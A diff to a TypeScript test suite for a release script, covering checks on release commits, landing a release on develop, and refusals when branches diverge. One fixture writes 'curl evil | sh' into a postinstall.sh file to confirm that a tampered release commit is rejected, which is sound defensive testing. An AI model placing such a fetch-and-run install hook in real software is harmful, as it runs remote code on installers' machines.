@@ -13,6 +13,7 @@ import {
   dropNotes,
   inFlight,
   insertSection,
+  landOnDevelop,
   lastTag,
   nextVersion,
   parseArgs,
@@ -20,6 +21,7 @@ import {
   prepare,
   releaseBranches,
   releaseCommitOf,
+  releaseState,
   runProblems,
   setVersion,
   subjectsSince,
@@ -403,6 +405,18 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
     const sloppy = commitOn(work, 'Release 1.1.0 (#3)', '1.1.0');
     const lower = commitOn(work, 'release 1.1.0', '1.1.0');
     const behind = commitOn(work, 'Release 1.1.0', '1.0.9');
+    // Right subject and version, but not develop plus the bump: another file changed next to it, or a parent develop lacks.
+    repo.git('checkout', '-q', '--detach', work);
+    version('1.1.0');
+    fs.writeFileSync(path.join(repo.dir, 'postinstall.sh'), 'curl evil | sh\n');
+    repo.git('add', '-A');
+    repo.git('commit', '-qm', 'Release 1.1.0');
+    const extra = sha();
+    repo.git('checkout', '-q', '--detach', 'main');
+    repo.git('commit', '-q', '--allow-empty', '-m', 'fix: only on main');
+    version('1.1.0');
+    repo.git('commit', '-qam', 'Release 1.1.0');
+    const foreign = sha();
     // The main update: main plus the release commit plus dist; a hotfix tip tracks dist with one parent.
     const mergeOnMain = (second: string) => {
       repo.git('checkout', '-q', '--detach', 'main');
@@ -430,9 +444,83 @@ test('releaseCommitOf accepts only a release commit npm run release made, or its
       ['a merge whose second parent is not a release commit', notOfARelease, '1.1.0', null],
       ['a main update asked for another version', update, '1.0.0', null],
       ['not a sha', 'HEAD', '1.1.0', null],
+      ['a release commit that changes another file', extra, '1.1.0', null],
+      ['a release commit whose parent develop lacks', foreign, '1.1.0', null],
     ];
-    for (const [what, tip, v, want] of rows) assert.equal(releaseCommitOf(repo.dir, tip, v), want, what);
+    // `develop` is the ref a release commit's parent must be on (origin/develop for a resume).
+    for (const [what, tip, v, want] of rows) assert.equal(releaseCommitOf(repo.dir, tip, v, 'develop'), want, what);
+    assert.equal(releaseCommitOf(repo.dir, release, '1.1.0', 'refs/remotes/origin/develop'), null, 'no origin/develop to be on');
+    repo.git('update-ref', 'refs/remotes/origin/develop', release);
+    assert.equal(releaseCommitOf(repo.dir, release, '1.1.0'), release, 'origin/develop is the default');
+    assert.equal(releaseCommitOf(repo.dir, update, '1.1.0'), release, 'a main update of it, by the default');
+    assert.equal(releaseCommitOf(repo.dir, foreign, '1.1.0'), null, 'a parent origin/develop lacks, by the default');
   } finally {
     repo.cleanup();
+  }
+});
+
+test('a landing whose push was declined is still in flight, and the next run pushes it as it is', POSIX, () => {
+  const notesDir = tmpDir('forge-release-notes-');
+  const repo = developRepo();
+  try {
+    const notes = path.join(notesDir, 'notes.md');
+    fs.writeFileSync(notes, '## 1.1.0\n\n- New things.\n');
+    const D = out(repo, 'rev-parse', 'develop');
+    const R = prepare(repo.dir, '1.0.0', '1.1.0', notes);
+    // The release PR merged: origin/main holds its merge, origin/develop is where it was, the branch is still on origin.
+    repo.git('checkout', '-q', '--detach', 'main');
+    repo.git('merge', '-q', '--no-ff', '-m', 'Merge pull request #9 from o/release/v1.1.0', R);
+    const M = out(repo, 'rev-parse', 'HEAD');
+    repo.git('checkout', '-q', 'develop');
+    repo.git('update-ref', 'refs/remotes/origin/develop', D);
+    repo.git('update-ref', 'refs/remotes/origin/main', M);
+    repo.git('update-ref', 'refs/remotes/origin/release/v1.1.0', R);
+    const inFlightAfterMerge = { developVersion: '1.0.0', mainVersion: '1.1.0', flight: { version: '1.1.0', from: 'branch' } };
+    assert.deepEqual(releaseState(repo.dir), inFlightAfterMerge);
+
+    // The run lands the release on local develop, and the maintainer declines the push.
+    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), R, 'origin/develop is still its parent: a fast-forward');
+    assert.equal(out(repo, 'rev-parse', 'develop'), R);
+    assert.equal(JSON.parse(fs.readFileSync(path.join(repo.dir, 'package.json'), 'utf8')).version, '1.1.0', 'the working tree reads the release now');
+    assert.deepEqual(releaseState(repo.dir), inFlightAfterMerge, 'the remotes decide, not the working tree');
+
+    // The repo deletes the branch on merge: it is found from main's version, and the landing is pushed as it is.
+    repo.git('update-ref', '-d', 'refs/remotes/origin/release/v1.1.0');
+    repo.git('branch', '-D', 'release/v1.1.0');
+    assert.deepEqual(releaseState(repo.dir), { ...inFlightAfterMerge, flight: { version: '1.1.0', from: 'main' } });
+    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), R);
+    assert.equal(out(repo, 'rev-parse', 'develop'), R, 'nothing new was committed');
+
+    // Once origin/develop has it, nothing is in flight and there is nothing to push.
+    repo.git('update-ref', 'refs/remotes/origin/develop', R);
+    assert.equal(landOnDevelop(repo.dir, R, '1.1.0'), null);
+    assert.equal(releaseState(repo.dir).flight, null);
+
+    // origin/develop moved on while the release was in flight: a Release merge on a develop that equals it.
+    const moveDevelop = (from: string, file: string, text: string) => {
+      repo.git('reset', '-q', '--hard', from);
+      fs.writeFileSync(path.join(repo.dir, file), text);
+      repo.git('commit', '-qam', 'feat: more develop work');
+      repo.git('update-ref', 'refs/remotes/origin/develop', 'HEAD');
+      return out(repo, 'rev-parse', 'HEAD');
+    };
+    const E = moveDevelop(D, 'README.md', '# moved\n');
+    const merged = landOnDevelop(repo.dir, R, '1.1.0') as string;
+    assert.equal(out(repo, 'rev-list', '--parents', '-n', '1', merged), `${merged} ${E} ${R}`);
+    assert.equal(out(repo, 'log', '-1', '--format=%s', merged), 'Release 1.1.0');
+    assert.equal(out(repo, 'rev-parse', 'HEAD'), merged);
+
+    // A develop with a commit origin/develop lacks that is not the landing, or one the release conflicts with, refuses.
+    repo.git('reset', '-q', '--hard', E);
+    fs.writeFileSync(path.join(repo.dir, 'README.md'), '# unpushed\n');
+    repo.git('commit', '-qam', 'feat: unpushed');
+    assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /develop differs from origin\/develop/.test(e.message));
+    const E2 = moveDevelop(D, 'package.json', JSON.stringify({ name: 'forge', version: '1.0.1' }));
+    assert.throws(() => landOnDevelop(repo.dir, R, '1.1.0'), (e: unknown) => e instanceof Refusal && /does not merge cleanly/.test(e.message));
+    assert.equal(out(repo, 'rev-parse', 'HEAD'), E2, 'the merge was aborted');
+    assert.equal(out(repo, 'status', '--porcelain', '--untracked-files=all'), '', 'a clean tree');
+  } finally {
+    repo.cleanup();
+    fs.rmSync(notesDir, { recursive: true, force: true });
   }
 });
